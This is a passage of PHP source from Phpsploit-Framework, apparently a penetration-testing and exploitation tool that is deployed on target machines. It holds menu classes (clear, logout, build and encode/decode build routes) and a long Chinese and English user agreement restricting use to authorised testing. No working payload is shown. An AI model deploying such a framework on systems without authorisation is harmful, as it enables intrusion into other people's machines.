\'Cancel\').")){document.location.href="' . Class_Base_Response ::get_url ( "/clear" , array ( "rand" => time () ) ) . '";}' ,
                ) ,
                array (
                    "title"    => "logout" ,
                    "describe" => "logout" ,
                    "href"     => 'javascript:if(confirm("Are you sure you want to log out? After logging out, if you want to use the Phpsploit Framework software again, you need to use the currently created account, password, and command board to log in again! Before officially logging out, it is recommended that you take note of your current account, password, command board, and other information! This can avoid the dilemma of not being able to log in again after logging out! If you forget your password after logging out, you can also contact the authorized party who authorizes you to conduct penetration testing or security audit behavior, and cooperate with them to uninstall the Phpsploit Framework software (this usually requires you to execute the \"php -f <Phpsploit Framework software project file path> /clear\" operation in the command line environment of the target machine to uninstall the Phpsploit Framework software)! Execute clear (select \'OK\'), discard clear (select \'Cancel\').")){document.location.href="' . Class_Base_Response ::get_url ( "/logout" , array () ) . '";}' ,                        //
                ) ,
            );
        }
        return self::$_menu;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-8
 * Time: 下午3:40
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_View_Build_Menu
{
    private static $_menu = null;

    public static function menu ( $params = array () )
    {
        if ( ! is_array ( $params ) ) {
            $params = array ();
        }
        if ( empty( self::$_menu ) ) {
            self::$_menu = array (
                array (
                    "title"    => "/build" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/build" , array ( "is_build" => 0 ) ) ,
                ) ,
                array (
                    "title"    => "/encode_build" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/encode_build" , array ( "is_build" => 0 ) ) ,
                ) ,
                array (
                    "title"    => "/decode_build" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/decode_build" , array ( "is_build" => 0 ) ) ,
                ) ,
            );
        }
        return self::$_menu;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-5-28
 * Time: 下午4:24
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_View_Default
{
    const DOCUMENT_CN_TITLE                                   = '用户协议与免责声明';
    const DOCUMENT_CN_BODY_TEXT_LINE_1                        = '第 一 条 phpsploit-framework 软件所提供的所有功能及信息仅可用于得到合法授权前提下的渗透测试、安全审计、安全技术研究与学习行为。phpsploit-framework 软件使用者(以下简称为“phpsploit-framework 软件用户”)明确同意在使用phpsploit-framework软件功能的过程中产生的一切风险将完全由phpsploit-framework 软件用户自己承担；因phpsploit-framework 软件用户使用phpsploit-framework软件所提供功能而产生的一切后果也完全由phpsploit-framework 软件用户自己承担；phpsploit-framework 软件作者对phpsploit-framework 软件用户在 phpsploit-framework 软件使用过程中给 phpsploit-framework 软件用户自己造成的任何影响及损失不承担任何责任；phpsploit-framework 软件作者对phpsploit-framework 软件用户在phpsploit-framework软件使用过程中给任何第三方造成的任何影响及损失不承担任何责任。';
    const DOCUMENT_CN_BODY_TEXT_LINE_2                        = '第 二 条 phpsploit-framework 软件用户在未取得被审计方以书面形式进行明确的合法授权情况下， phpsploit-framework 软件用户禁止使用 phpsploit-framework 软件向被审计方的网络环境、系统环境、数据库环境、办公环境等空间开展包括渗透测试、安全审计等在内的任何形式上的、可能会给被审计方造成各类风险及人身或经济损失伤害后果的所有行为；如因phpsploit-framework 软件用户的个人行为而给任何第三方造成任何影响及损失， phpsploit-framework 软件作者不承担任何责任。同时，phpsploit-framework 软件作者保留对 phpsploit-framework 软件用户在 phpsploit-framework 软件使用过程中发生的所有超越 phpsploit-framework 软件用途限制及相关约束的任何情况下产生的所有侵权行为进行法律追责的相关权利。';
    const DOCUMENT_CN_BODY_TEXT_LINE_3                        = '第 三 条 phpsploit-framework 软件用户在部署并使用 phpsploit-framework 软件之前， phpsploit-framework 软件用户必须对部署前环境进行完整数据备份，并同时做好相应安全处理（包括但不限于有效的容灾备份处理、有效的灾难恢复设置、有效的安全问题与故障问题记录等）。如因 phpsploit-framework 软件用户个人原因而导致被部署环境出现任何问题或产生任何人身、财产损失及影响，phpsploit-framework 软件作者不承担任何责任。';
    const DOCUMENT_CN_BODY_TEXT_LINE_4                        = '第 四 条 phpsploit-framework 软件用户在使用 phpsploit-framework 软件所提供功能时，可能会产生各类网络通信行为，这将可能导致相关流量通信费用的产生（注意：在非免费网络环境中，这种情况将变得比较明显），如 phpsploit-framework 软件用户无法接受此类通信与流量费用的产生，请避免在非免费网络环境中使用 phpsploit-framework 软件。由于 phpsploit-framework 软件用户自身网络原因而产生的流量费用，phpsploit-framework 软件作者不承担任何责任。';
    const DOCUMENT_CN_BODY_TEXT_LINE_5                        = '第 五 条 在使用 phpsploit-framework 软件提供的功能时， phpsploit-framework 软件用户必须保证自身环境与phpsploit-framework软件的部署环境之间的网络通信安全!不安全的局域网或广域网环境(例如使用HTTP协议进行web通信)可能导致phpsploit-framework软件用户在使用phpsploit-framework软件特性时受到网络黑客的恶意攻击(包括但不限于网络通信数据窃取、劫持等网络攻击)!这种情况的发生可能会导致 phpsploit-framework 软件的网络通信数据被窃取、篡改和恶意利用!不安全的网络通信环境会直接或间接地对 phpsploit-framework 软件的部署环境造成严重的安全威胁!如果 phpsploit-framework 软件用户无法保证自身环境和 phpsploit-framework 软件部署环境的网络通信安全(例如，网络通信使用不安全的HTTP协议，而不是更安全的HTTPS协议，或者 phpsploit-framework 软件用户自身也处于不受信任的网络环境中)， phpsploit-framework 软件用户应立即停止使用并卸载 phpsploit-framework 软件，删除使用 phpsploit-framework 软件上传、下载和创建的所有目录和文件，并将 phpsploit-framework 软件所在环境恢复到部署 phpsploit-framework 软件之前的环境。 如因 phpsploit-framework 软件用户自身或 phpsploit-framework 的部署环境中的安全问题而给 phpsploit-framework 软件用户自身及其它任何第三方造成任何直接和间接的影响，以及人身和财产损失(包括但不限于恶意黑客从事网络数据包捕获、通信数据劫持、恶意使用劫持的敏感信息等)，phpsploit-framework 软件作者不承担任何责任。';
    const DOCUMENT_CN_BODY_TEXT_LINE_6                        = '第 六 条 当政府司法机关依照法定程序要求phpsploit-framework 软件作者停止继续对外开放phpsploit-framework 软件的使用授权时，phpsploit-framework 软件作者将根据执法单位之要求或为公共安全之目的停止对外开放phpsploit-framework 软件的使用授权（phpsploit-framework 软件作者保留再次重新对外开放phpsploit-framework 软件使用授权的相关权利）。在此情况下，任何未经phpsploit-framework 软件作者重新授权的phpsploit-framework 软件使用行为都将被认定为侵权，phpsploit-framework 软件作者保留对其进行法律追究的相关权利。';
    const DOCUMENT_CN_BODY_TEXT_LINE_7                        = '第 七 条 在 phpsploit-framework 软件的生产环境中使用 phpsploit-framework 软件开发或测试环境密码是一种非常危险的行为（常见密码通常为更多人所知，这大大增加了 phpsploit-framework 软件被恶意攻击成功的风险）！ phpsploit-framework 软件附带了专门为创建生产环境帐户和密码信息而设计的相关功能模块（通常，使用 phpsploit-framework 软件内置功能模块创建的帐户和密码具有相对较高的安全强度）。如果 phpsploit-framework 软件的用户没有使用 phpsploit-framework 软件的固有功能模块来创建 phpsploit-framework 软件的帐户和密码信息，或者如果 phpsploit-framework 软件用户将 phpsploit-framework 软件的帐号和密码信息通知他人，则由此产生的所有责任后果（包括任何公共或私人数据泄露、其他个人或财产损失以及所有直接或间接影响）应由 phpsploit-framework 软件用户自行承担， phpsploit-framework 软件作者不承担责任。';
    const DOCUMENT_CN_BODY_TEXT_LINE_8                        = '第 八 条 phpsploit-framework 软件本身，可能会存在各类设计缺陷、代码编写错误、风险漏洞等安全问题，phpsploit-framework软件作者无法保证phpsploit-framework 软件所提供功能的绝对安全性、绝对稳定性、绝对正确性、绝对完整性、绝对兼容性等情况，phpsploit-framework 软件作者将尽力去减少此类问题情况的发生，尽可能地去对已发现问题并进行问题修复。尽管如此，phpsploit-framework 软件仍可能存在未被修复或未被发现的安全漏洞和软件错误问题。phpsploit-framework 软件用户在使用phpsploit-framework软件的过程中如果发生任何问题，phpsploit-framework 软件作者均得免责。';
    const DOCUMENT_CN_BODY_TEXT_LINE_9                        = '第 九 条 phpsploit-framework 软件属于开源软件，遵循开源软件规则（GPLv3：GNU 公共许可证），但 phpsploit-framework 软件作者对于 phpsploit-framework 软件的开源程度，仍然做了一定的补充性约束（这主要是为了在一定程度上保证 phpsploit-framework 软件的可控性及后续良性发展！ phpsploit-framework 软件作者认为，失控的开源软件是非常危险的），补充性约束内容包括：phpsploit-framework 软件用户可以在一定程度上对其所获得的 phpsploit-framework 软件 进行修改、优化，但经过其自行修改优化后的phpsploit-framework 软件变体版本仅限phpsploit-framework 软件用户自己与其自身工作团队内部使用，经过 phpsploit-framework 软件用户修改优化后的phpsploit-framework 软件变体版本，不得以新软件身份公开对外发布（phpsploit-framework 软件用户可考虑将自行修改优化后的phpsploit-framework 软件变体提交给 phpsploit-framework 软件作者，由 phpsploit-framework 软件作者对 phpsploit-framework 软件用户提交的软件变体版本代码进行审核，在审核通过之后，phpsploit-framework 软件作者会将phpsploit-framework 软件用户提交的软件变体统一发布到phpsploit-framework 软件的官方平台。phpsploit-framework 软件作者将在变体分支上保留变体提交者的署名，用以鼓励与支持变体提交者对phpsploit-framework 软件作出的优秀贡献）。同时，phpsploit-framework 软件用户务必在 phpsploit-framework 软件的修改变体上保留 phpsploit-framework 软件原作者对于 phpsploit-framework 软件的全部权利声明（包括但不限于 phpsploit-framework 软件的版权及软件著作权声明等）。';
    const DOCUMENT_CN_BODY_TEXT_LINE_10                       = '第 十 条 任何由于黑客攻击、计算机病毒侵入或发作、因政府管制等而造成的软件功能性关闭、软件功能缺失、软件功能遭受篡改与恶意利用等影响软件正常运行的不可抗力而造成的公\私资料泄露、丢失、被盗用或被篡改等，phpsploit-framework 软件作者均得免责。';
    const DOCUMENT_CN_BODY_TEXT_LINE_11                       = '第 十 一 条 由于与phpsploit-framework 软件链接的其它第三方软件功能或网络站点所造成的公\私资料泄露及由此而导致的任何法律争议和后果，phpsploit-framework 软件作者均得免责。';
    const DOCUMENT_CN_BODY_TEXT_LINE_12                       = '第 十 二 条 phpsploit-framework 软件如因软件功能维护或升级而需新增、关停、卸载相关软件重要功能时，将在软件版本更新或软件上架下架时进行公告。若因phpsploit-framework 软件作者控制能力范围外的软硬件故障或其它不可抗力（如黑客攻击等）而导致软件功能遭破坏或篡改等，给 phpsploit-framework 软件用户造成的一切风险与损失，phpsploit-framework 软件作者不负任何责任。';
    const DOCUMENT_CN_BODY_TEXT_LINE_13                       = '第 十 三 条 phpsploit-framework 软件用户因为违反本声明的规定而触犯所在国家法律的，一切后果全部由 phpsploit-framework 软件用户自己负责与承担，phpsploit-framework 软件作者不承担任何责任。';
    const DOCUMENT_CN_BODY_TEXT_LINE_14                       = '第 十 四 条 任何人以任何方式下载或使用 phpsploit-framework 软件，或直接或间接使用属于 phpsploit-framework 软件的任何源代码（不属于phpsploit-framework 软件的第三方代码库中的代码不在此限制范围之内），都将被视为自愿接受 phpsploit-framework 软件声明的所有限制。';
    const DOCUMENT_CN_BODY_TEXT_LINE_15                       = '第 十 五 条 本声明未涉及的问题参见国家有关法律法规，当本声明与国家法律法规冲突时，以国家法律法规为准。';
    const DOCUMENT_CN_BODY_TEXT_LINE_16                       = '第 十 六 条 phpsploit-framework 软件作者不担保 phpsploit-framework 软件功能一定能满足 phpsploit-framework 软件用户的要求，也不担保 phpsploit-framework 软件功能不会存在任何的安全风险，对 phpsploit-framework 软件功能的及时性、安全性、稳定性、完整性、准确性、兼容性等也都不作任何担保。';
    const DOCUMENT_CN_BODY_TEXT_LINE_17                       = '第 十 七 条 phpsploit-framework 软件作者不保证为向phpsploit-framework 软件用户提供便利而设置的外部链接的准确性、完整性、安全性、及时性。同时，对于该等外部链接指向的不由phpsploit-framework 软件作者实际控制的任何资源或网页上的内容，phpsploit-framework 软件作者不承担任何责任。';
    const DOCUMENT_CN_BODY_TEXT_LINE_18                       = '第 十 八 条 对于因不可抗力或phpsploit-framework 软件作者不能控制的原因造成的软件功能异常或其它安全风险性情况的，phpsploit-framework 软件作者不承担任何责任，但将尽力减少因此而给phpsploit-framework 软件用户造成的损失和影响。';
    const DOCUMENT_CN_BODY_TEXT_LINE_19                       = '第 十 九 条 phpsploit-framework 软件作者所发的第三方项目名称、第三方项目链接、第三方音视频资料、第三方文字图片资料等分享内容，仅是第三方项目信息介绍，并不能作为第三方与phpsploit-framework 软件作者存在合作关系的有效判断依据。phpsploit-framework 软件用户应理性对待第三方项目的信息介绍内容（第三方项目权属由于归第三方所有，因此phpsploit-framework 软件作者无法保证第三方项目的绝对安全、正确、实时、有效等情况，phpsploit-framework 软件用户在访问及使用第三方项目内容时需自行鉴别与处理第三方项目内容可能涉及的内容安全性、正确性、有效性、实时性等问题），对于phpsploit-framework 软件用户由于看到此类信息，付诸相应反映行动而造成损失或其它后果的， phpsploit-framework 软件作者不承担任何责任。';
    const DOCUMENT_CN_BODY_TEXT_LINE_20                       = '第 二 十 条 phpsploit-framework 软件作者拥有phpsploit-framework软件的包括版权及软件著作权等在内的全部权利，phpsploit-framework软件作者对外公开发放的仅为phpsploit-framework软件的软件使用授权，且仅在phpsploit-framework 软件用户在合法合规前提下使用本 phpsploit-framework 软件所提供功能时，phpsploit-framework 软件用户才被认可为已获得了phpsploit-framework 软件作者对于phpsploit-framework软件功能使用的合法授权，否则将视为phpsploit-framework 软件用户违反了本用户协议内容约定，对phpsploit-framework软件作者构成侵权行为。phpsploit-framework软件作者将保留对phpsploit-framework 软件用户的侵权行为进行依法追责的相关权利。';
    const DOCUMENT_CN_BODY_TEXT_LINE_21                       = '第 二 十 一 条 phpsploit-framework 软件用户不得以任何形式将 phpsploit-framework 软件用于商业用途或商业活动。如果 phpsploit-framework 软件用户需要将 phpsploit-framework 软件用于商业用途或商业活动，则必须事先得到 phpsploit-framework 软件作者对其进行的额外授权，否则即被认定为 phpsploit-framework 软件用户的行为已对 phpsploit-framework 软件作者构成侵权。';
    const DOCUMENT_CN_BODY_TEXT_LINE_22                       = '第 二 十 二 条 phpsploit-framework 软件的开源规则基于GPLv3开源协议，本《用户协议与免责声明》的所有内容将以补充条款的形式对 phpsploit-framework 软件用户形成法律约束。本《用户协议与免责声明》中的所有内容与《GPLv3开源协议》中的所有内容具有同等的法律约束力。如果GPLv3开源协议中的内容与本用户协议和免责声明中的内容产生冲突，则以本用户协议和免责声明中的内容为准。';
    const DOCUMENT_CN_BODY_TEXT_LINE_23                       = '第 二 十 三 条 phpsploit-framework 软件之声明以及其修改权、更新权及最终解释权均属phpsploit-framework 软件作者所有。';
    const DOCUMENT_CN_CONFIRM                                 = '注意：继续使用本软件，即代表您已接受并认可上述所有用户协议与免责声明条款！如您拒绝接受上述条款内容，请立即停止使用本软件！否则将被视为侵权行为，软件作者保留追究侵权责任的合法权利。';
    const DOCUMENT_CN_COMMAND_LINE_FORM_PARAMETER_DESCRIPTION = '说明：在CLI模式下使用本软件时，传递表单参数（is_enable_license_agreement=1），即可不再显示此用户协议与免责声明信息！is_enable_license_agreement 参数值含义：0=拒绝接受协议内容；1=同意接受协议内容。';

    const DOCUMENT_EN_TITLE                                   = 'User Authorization and License Agreement (Disclaimer)';
    const DOCUMENT_EN_BODY_TEXT_LINE_1                        = '1、All functions and information provided by the Phpsploit-Framework software can only be used for penetration testing, security auditing, security technology research, and learning behavior with legal authorization. The user of the Phpsploit-Framework software (hereinafter referred to as the "Phpsploit-Framework software user") expressly agrees that all risks arising from the use of the functions of the Phpsploit-Framework software will be solely borne by the Phpsploit-Framework software user; All consequences arising from the use of the functions provided by the Phpsploit-Framework software by users of the Phpsploit-Framework software shall be entirely borne by the users of the Phpsploit-Framework software themselves; The author of the Phpsploit-Framework software shall not be liable for any impact or loss caused by users of the Phpsploit-Framework software during their use; The author of the Phpsploit-Framework software shall not be liable for any impact or loss caused to any third party by users of the Phpsploit-Framework software during its use.';
    const DOCUMENT_EN_BODY_TEXT_LINE_2                        = '2、Users of the Phpsploit-Framework software are prohibited from engaging in any form of behavior that may lead to harmful consequences in the audited party\'s network environment, system environment, database environment, office environment, and other spaces without obtaining explicit written legal authorization from the audited party, including penetration testing, security auditing, etc. If any impact or loss is caused to any third party due to the personal behavior of the users of the Phpsploit-Framework software, the author of the Phpsploit-Framework software shall not be liable. At the same time, the author of the Phpsploit-Framework software reserves the right to pursue legal liability for any infringement of the Phpsploit-Framework software user agreement by Phpsploit-Framework software users.';
    const DOCUMENT_EN_BODY_TEXT_LINE_3                        = '3、Before deploying and using the Phpsploit-Framework software, users of the Phpsploit-Framework software must perform a complete data backup of the pre deployment environment and take corresponding security measures (including but not limited to effective disaster recovery backup measures, effective disaster recovery settings, effective security and fault recording measures, etc.) to ensure that in the event of unexpected situations, The deployed environment of the Phpsploit-Framework software can be restored to the pre deployment environment.If any problems occur in the deployed environment (including any personal or property damage, etc.) due to personal reasons of the users of the Phpsploit-Framework software, the author of the Phpsploit-Framework software shall not be liable.';
    const DOCUMENT_EN_BODY_TEXT_LINE_4                        = '4、Phpsploit-Framework software users may experience various network communication behaviors when using the functions provided by Phpsploit-Framework software, which may result in related traffic communication costs (for example, if you use Phpsploit-Framework software in the data connection mode of a mobile communication operator). If Phpsploit-Framework software users cannot accept such communication and the related network traffic costs that may arise from it, Please avoid using Phpsploit-Framework software. The author of the Phpsploit-Framework software shall not be responsible for any traffic expenses incurred by users of the Phpsploit-Framework software due to their own network reasons.';
    const DOCUMENT_EN_BODY_TEXT_LINE_5                        = '5、When using the functions provided by Phpsploit-Framework software, users of Phpsploit-Framework software must ensure network communication security between their own environment and the deployment environment of Phpsploit-Framework software! Unsecure local or wide area network environments (such as using the HTTP protocol for web communication) may result in Phpsploit-Framework software users being subjected to malicious attacks from network hackers during the use ofPhpsploit-Framework software features (including but not limited to network communication data theft, hijacking, and other network attacks)! The occurrence of this situation may cause the network communication data of Phpsploit-Framework software to be stolen, tampered with, and maliciously utilized! An insecure network communication environment can directly or indirectly pose a serious security threat to the deployment environment of Phpsploit-Framework software! If Phpsploit-Framework software users are unable to ensure the network communication security of their own environment and the deployment environment of Phpsploit-Framework software (for example, network communication uses the insecure HTTP protocol instead of the more secure HTTPS protocol, or Phpsploit-Framework software users themselves are also in an untrusted network environment), Users of the Phpsploit-Framework software should immediately stop using and uninstall the Phpsploit-Framework software, delete all directories and files uploaded, downloaded, and created using the Phpsploit-Framework software, and restore the environment where the Phpsploit-Framework software was located to the environment before the Phpsploit-Framework software was deployed. Various direct and indirect impacts, as well as personal and property losses, caused by security issues in the Phpsploit-Framework software user\'s own or deployment environment (including but not limited to malicious hackers engaging in network packet capturing, communication data hijacking, malicious use of hijacked sensitive information, etc.), The author of the Phpsploit-Framework software does not assume any responsibility.';
    const DOCUMENT_EN_BODY_TEXT_LINE_6                        = '6、When the government judicial authorities, in accordance with legal procedures, require authors of the Phpsploit-Framework software to stop continuing to open the use authorization of the Phpsploit-Framework software to the public, The author of the Phpsploit-Framework software will cease the authorization of the use of the Phpsploit-Framework software to the public in accordance with the requirements of law enforcement agencies or for public safety purposes (the author of the Phpsploit-Framework software reserves the right to reopen the Phpsploit-Framework software to the public again). In this case, if a user of the Phpsploit-Framework software continues to use the Phpsploit-Framework software without obtaining re authorization from the author of the Phpsploit-Framework software, it will be considered an infringement on the author of the Phpsploit-Framework software, and the author of the Phpsploit-Framework software reserves the relevant rights to pursue legal action against them.';
    const DOCUMENT_EN_BODY_TEXT_LINE_7                        = '7、Using Phpsploit-Framework software development or testing environment passwords in the production environment of Phpsploit-Framework software is a very dangerous behavior (common passwords are usually known to more people, which greatly increases the risk of Phpsploit-Framework software being successfully attacked by malicious attacks)! The Phpsploit-Framework software comes with relevant functional modules specifically designed for creating production environment accounts and password information (usually, accounts and passwords created using the built-in functional modules of the Phpsploit-Framework software have relatively high security strength). If users of the Phpsploit-Framework software do not use the inherent functional modules of the Phpsploit-Framework software to create account and password information of the Phpsploit-Framework software, Or if the user of the Phpsploit-Framework software notifies others of the account and password information of the Phpsploit-Framework software, then all liability consequences arising from this (including any public or private data leakage, other personal or property losses, and all direct or indirect impacts) shall be borne by the Phpsploit-Framework software user, and the Phpsploit-Framework software author shall not be liable.';
    const DOCUMENT_EN_BODY_TEXT_LINE_8                        = '8、The Phpsploit-Framework software itself may have various security issues, such as design flaws, code writing errors, and risk vulnerabilities. The author of the Phpsploit-Framework software cannot guarantee the absolute security, stability, accuracy, completeness, and compatibility of the functions provided by the Phpsploit-Framework software. The authors of the Phpsploit-Framework software will make every effort to reduce the occurrence of such problems, actively explore security risks as much as possible, and fix identified security risk issues. However, there may still be security vulnerabilities and software error issues that have not been fixed or discovered in the Phpsploit-Framework software. If users of the Phpsploit-Framework software encounter any issues while using the Phpsploit-Framework software, the author of the Phpsploit-Framework software shall be exempt from liability.';
    const DOCUMENT_EN_BODY_TEXT_LINE_9                        = '9、Phpsploit-Framework software belongs to open source software and follows the rules of open source software (GPLv3: GNU public license), but the author of Phpsploit-Framework software has some supplementary constraints on its use (mainly to ensure the controllability and subsequent healthy development of Phpsploit-Framework software to a certain extent)! Supplementary constraints include: users of the Phpsploit-Framework software can modify and optimize the Phpsploit-Framework software to a certain extent. However, the variant version of the Phpsploit-Framework software that has been modified and optimized by users of the Phpsploit-Framework software is only available for internal use by Phpsploit-Framework software users and their own work teams. The variant version of the Phpsploit-Framework software that has been modified and optimized by users of the Phpsploit-Framework software is not allowed to be publicly released as a new software. Phpsploit-Framework software users can consider submitting their modified and optimized versions of Phpsploit-Framework software variants to the authors of the Phpsploit-Framework software. The author of the Phpsploit-Framework software will review the software variant version code submitted by users of the Phpsploit-Framework software. After approval, the author of the Phpsploit-Framework software will publish all software variants submitted by users of the Phpsploit-Framework software to the official platform of the Phpsploit-Framework software. The author of the Phpsploit-Framework software will retain the signature of the variant submitter on the variant branch to encourage and support the outstanding contributions made by the variant submitter to the Phpsploit-Framework software. At the same time, users of the Phpsploit-Framework software must retain all rights notices of the original author of the Phpsploit-Framework software regarding modifications and variations of the Phpsploit-Framework software (including but not limited to the copyright and software copyright notices of the Phpsploit-Framework software).';
    const DOCUMENT_EN_BODY_TEXT_LINE_10                       = '10、The author of the Phpsploit-Framework software shall not be held responsible for any public or private data leakage, loss, theft, or tampering caused by force majeure that affects the normal operation of the software, such as hacker attacks, computer virus intrusion or outbreak, government regulation, etc.';
    const DOCUMENT_EN_BODY_TEXT_LINE_11                       = '11、The author of the Phpsploit-Framework software shall not be liable for any legal disputes or consequences arising from the leakage, damage, loss of public or private data caused by other third-party software functions or network sites linked to the Phpsploit-Framework software.';
    const DOCUMENT_EN_BODY_TEXT_LINE_12                       = '12、If important software features need to be added, closed, or uninstalled due to software functionality maintenance or upgrades, notifications will be made during the version update or removal process of the Phpsploit-Framework software. If the software functionality is damaged or tampered with due to software or hardware failures or other force majeure beyond the control of the Phpsploit-Framework software author (such as hacker attacks), and all risks and losses caused to Phpsploit-Framework software users as a result, the Phpsploit-Framework software author shall not be liable.';
    const DOCUMENT_EN_BODY_TEXT_LINE_13                       = '13、If a user of the Phpsploit-Framework software violates the laws of their country due to violating the provisions of this statement, all consequences shall be the responsibility and responsibility of the Phpsploit-Framework software user, and the author of the Phpsploit-Framework software shall not be held responsible.';
    const DOCUMENT_EN_BODY_TEXT_LINE_14                       = '14、Any person who downloads or uses the Phpsploit-Framework software in any way, or directly or indirectly uses any source code belonging to the Phpsploit-Framework software (excluding code in third party code libraries), will be deemed to voluntarily accept all restrictions stated by the Phpsploit-Framework Software.';
    const DOCUMENT_EN_BODY_TEXT_LINE_15                       = '15、The issues not covered in this statement refer to relevant national laws and regulations. In case of conflicts between this statement and national laws and regulations, national laws and regulations shall prevail.';
    const DOCUMENT_EN_BODY_TEXT_LINE_16                       = '16、The author of the Phpsploit-Framework software does not guarantee that the functionality of the Phpsploit-Framework software will meet the requirements of Phpsploit-Framework software users, nor does it guarantee that the functionality of the Phpsploit-Framework software will not pose security risks, nor does it guarantee the timeliness, security, stability, integrity, accuracy, compatibility, and other aspects of the Phpsploit-Framework software.';
    const DOCUMENT_EN_BODY_TEXT_LINE_17                       = '17、The author of the phpsploit framework software does not guarantee the accuracy, completeness, security, or timeliness of external links set up to provide convenience to users of the phpsploit framework software. At the same time, the author of the phpsploit framework software shall not be responsible for any resources or content on web pages that are not actually controlled by the author of the phpsploit framework software, as pointed to by such external links.';
    const DOCUMENT_EN_BODY_TEXT_LINE_18                       = '18、The authors of the Phpsploit Framework Software shall not be liable for any abnormal software function or other security risks due to force majeure or causes beyond the author\'s expectation and control, but will make every effort to minimize the loss and impact on the users of the Phpsploit Framework software.';
    const DOCUMENT_EN_BODY_TEXT_LINE_19                       = '19、The shared content published by the author of phpsploit-framework software (including third-party project names, third-party project links, third-party audio and video materials, third-party graphic materials, etc.) is only an introduction to third-party project information, and cannot be used as an effective basis for determining whether there is a cooperative relationship between the two parties. The user of phpsploit-framework software should rationally treat the content introduced by the third party project information (because the ownership of the third party project belongs to the third party, the author of phpsploit-framework software cannot guarantee the absolute security, correctness, real-time and effectiveness of the third party project)!   Users of phpsploit-framework software need to independently identify and deal with issues such as security, accuracy, effectiveness and real-time performance of third-party projects!   The author of the phpsploit-framework software shall not be liable for any loss or other consequences caused by the user of the phpsploit-framework software seeing this information and acting accordingly.';
    const DOCUMENT_EN_BODY_TEXT_LINE_20                       = 'The author of the Phpsploit-Framework software owns all rights to the Phpsploit-Framework software, including copyright and software copyright.    The author only publicly releases the software use authorization of Phpsploit-Framework software, and only when Phpsploit-Framework software users use the functions provided by Phpsploit-Framework software under legal and compliant conditions, The Phpsploit-Framework software user\'s behavior of using Phpsploit-Framework software is considered to have obtained the legal authorization of the Phpsploit-Framework software author.    Otherwise, it will be deemed that the Phpsploit-Framework software user has violated the provisions of this user agreement, constituting infringement of the Phpsploit-Framework software author.    The author of Phpsploit-Framework software reserves the right to pursue the infringement liability of Phpsploit-Framework software users according to law.';
    const DOCUMENT_EN_BODY_TEXT_LINE_21                       = '21、Phpsploit-Framework Software Users shall not use Phpsploit-Framework software for commercial purposes or commercial activities in any form. If the Phpsploit-Framework software user needs to use the Phpsploit-Framework software for commercial purposes or commercial activities, it must obtain additional authorization from the Phpsploit-Framework software author in advance. Otherwise, it is considered that the behavior of the Phpsploit-Framework software user has infringed the Phpsploit-Framework software author.';
    const DOCUMENT_EN_BODY_TEXT_LINE_22                       = '22、The open source rules of Phpsploit-Framework software are based on the GPLv3 open source Agreement, and all contents of this "User Agreement and Disclaimer" will form legal constraints for Phpsploit-Framework software users in the form of supplementary terms.  All contents in this "User Agreement and Disclaimer" shall have the same legal binding effect as all contents in the GPLv3 Open Source Agreement.  In the event of a conflict between the content of the GPLv3 Open Source Agreement and the content of this User Agreement and Disclaimer, the content of this User Agreement and Disclaimer shall prevail.';
    const DOCUMENT_EN_BODY_TEXT_LINE_23                       = '23、The statement of the Phpsploit-Framework software, as well as its modification, update, and final interpretation rights, belong to the author of the Phpsploit-Framework software.';
    const DOCUMENT_EN_CONFIRM                                 = 'Attention: Continuing to use this software means that you have accepted and recognized all the user agreements and disclaimer terms mentioned above! If you refuse to accept the above terms and conditions, please immediately stop using this software! Otherwise, it will be considered as an infringement, and the software author reserves the legal right to pursue infringement liability.';
    const DOCUMENT_EN_COMMAND_LINE_FORM_PARAMETER_DESCRIPTION = 'Explanation: When using this software in CLI mode, passing the form parameter (is_enable_license_agreement=1) will no longer display this user protocol and disclaimer information! Is_ Enable_ License_ The meaning of the agreement parameter value: 0=Refuse to accept the agreement content; 1=Agree to accept the agreement content.';


    private static $_document_body = "";

    public static function get_document_title ()
    {
        $_lang = Class_Base_Request::form ( "lang" , "string" , "en" );
        if ( $_lang == "cn" ) {
            return self::DOCUMENT_CN_TITLE;
        } else {
            return self::DOCUMENT_EN_TITLE;
        }
    }

    public static function get_document_body ()
    {
        $_lang = Class_Base_Request::form ( "lang" , "string" , "en" );
        if ( $_lang == "cn" ) {
            self::$_document_body = "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_CN_BODY_TEXT_LINE_1 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_CN_BODY_TEXT_LINE_2 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_CN_BODY_TEXT_LINE_3 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_CN_BODY_TEXT_LINE_4 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_CN_BODY_TEXT_LINE_5 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_CN_BODY_TEXT_LINE_6 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_CN_BODY_TEXT_LINE_7 . "\n";
            self::$_document_body .= "\n" . self::DOCUMENT_CN_BODY_TEXT_LINE_8 . "\n";
